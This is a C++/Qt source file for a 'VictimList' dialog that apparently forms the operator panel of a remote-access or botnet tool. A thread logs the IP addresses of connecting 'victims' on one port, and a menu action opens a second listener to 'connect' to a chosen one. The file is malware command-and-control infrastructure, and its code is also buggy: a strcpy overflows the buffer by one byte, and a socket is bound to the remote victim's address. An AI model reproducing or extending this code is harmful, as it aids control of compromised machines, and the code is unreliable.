#include"VictimList.h"

SOCKET g_csock;
SOCKADDR_IN g_saddr = { 0, };
SOCKADDR_IN g_caddr = { 0, };
VictimList::VictimList(QWidget * parent) : QDialog(parent), ui(new Ui::Vl_Dialog)
{

	HANDLE handle;
	HANDLE thread;
	VL_THREAD_PARAM* vl = new VL_THREAD_PARAM;
	ui->setupUi(this);
	
	QStringList* list = new QStringList;


	model = new QStringListModel(this);

	ui->Lv->setContextMenuPolicy(Qt::CustomContextMenu);

	ui->Lv->setEditTriggers(QAbstractItemView::NoEditTriggers);

	vl->ui = ui;
	vl->model = model;
	
	thread = (HANDLE)_beginthreadex(NULL, NULL, VictimListfn, (LPVOID)vl, NULL, NULL);

	connect(ui->Lv, SIGNAL(customContextMenuRequested(QPoint)), SLOT(CustomMenuSlots(QPoint)));


}


void VictimList::CustomMenuSlots(QPoint pos)
{
	QModelIndex Mindex = ui->Lv->indexAt(pos);

	QMenu* menu = new QMenu(this);

	QAction* action1 = new QAction();

	action1->setStatusTip(tr("Connecting"));



	connect(action1, SIGNAL(triggered()), this, SLOT(context()));

	menu->popup(ui->Lv->viewport()->mapToGlobal(pos));


	menu->addAction(action1);

	QPoint point;
	point = menu->mapToParent(pos);



}

#define Connect(socket_descripter,connect_info) connect((socket_descripter),(connect_info),sizeof(SOCKADDR_IN))
void VictimList::context() 
{

		QModelIndexList list = ui->Lv->selectionModel()->selectedIndexes();
		QStringList slist;
		int flag = 1;
		QString str;
		
		SOCKET ssock, csock;
		SOCKADDR_IN saddr = { 0, };
		char* address=nullptr;
		int caddr_size = sizeof(saddr);
		foreach(const QModelIndex Mindex, list)
		{
			//텍스트 형식으로 렌더링 할 키 데이터
			str = Mindex.data(Qt::DisplayRole).toString();

		}
		QMessageBox::about(NULL, str, str);
		char pname[100] = { 0, };
		//closesocket(csock);
		qsnprintf(pname, sizeof(pname), str.toUtf8().constData());
		address = new char[strlen(pname)];
		ZeroMemory(address, strlen(pname));
		strcpy(address, pname);
		ssock = socket(AF_INET, SOCK_STREAM, 0);
		saddr.sin_family = AF_INET;
		saddr.sin_addr.s_addr = inet_addr(address);
		saddr.sin_port = htons(ACCEPT_PORT);
		bind(ssock,(LPSOCKADDR)&saddr,sizeof(saddr));
		
		listen(ssock, 64);
		
		if((csock = Accept(ssock))==SOCKET_ERROR)
			QMessageBox::about(NULL, tr("FAILED"), tr("CONNECTED FAILED"));
		else
			QMessageBox::about(NULL, tr("SUCCES"), tr("CONNECTED SUCCESSFUL"));

		closesocket(ssock);
		closesocket(csock);
		close();
		//send(csock, pname, strlen(pname), 0);
		//qDebug() << slist.join(",");
	

}

VictimList::~VictimList() 
{

}

unsigned WINAPI VictimListfn(LPVOID v) 
{

	SOCKET ssock,csock;
	VL_THREAD_PARAM* vl = (VL_THREAD_PARAM*)v;
	QStringList list;
	//std::vector<std::string> sub_list;
	std::set<std::string> sub_list;
	g_saddr.sin_family = AF_INET;
	g_saddr.sin_addr.s_addr = htonl(INADDR_ANY);
	g_saddr.sin_port = htons(SIGNAL_PORT);
	
	ssock = socket(AF_INET, SOCK_STREAM, 0);
	bind(ssock, (LPSOCKADDR)&g_saddr, sizeof(g_saddr));
	listen(ssock, 64);
	int caddr_size = sizeof(g_caddr);
	while (1) {
		for (int i = 0; i < 10;i++) {
			
			ZeroMemory(&g_caddr, sizeof(g_caddr));
			csock = accept(ssock, (LPSOCKADDR)&g_caddr, &caddr_size);
			//sub_list.push_back(inet_ntoa(g_caddr.sin_addr));
			sub_list.emplace(inet_ntoa(g_caddr.sin_addr));
			/*if (!list.isEmpty())
				if (list.begin()->compare(inet_ntoa(g_caddr.sin_addr)) == 0)
					break;*/
			

			//list << inet_ntoa(g_caddr.sin_addr);
			//closesocket(ssock);
			
			closesocket(csock);
			
		}

		//sub_list.erase(unique(sub_list.begin(), sub_list.end()), sub_list.end());

		/*for (auto iter = begin(sub_list); iter != end(sub_list); iter++)
			list <<(const char*)(iter->c_str());*/
	
		for (auto iter = begin(sub_list); iter != end(sub_list); iter++)
			list << static_cast<const char*>(iter->c_str());

		sub_list.clear();
		vl->model->setStringList(list);
		vl->ui->Lv->setModel(vl->model);
		list.clear();

		Sleep(10000);
	}

	_endthreadex(10);
	return 0;

}

SOCKET Accept(SOCKET ssock) 
{


	return accept(ssock, NULL, NULL);
}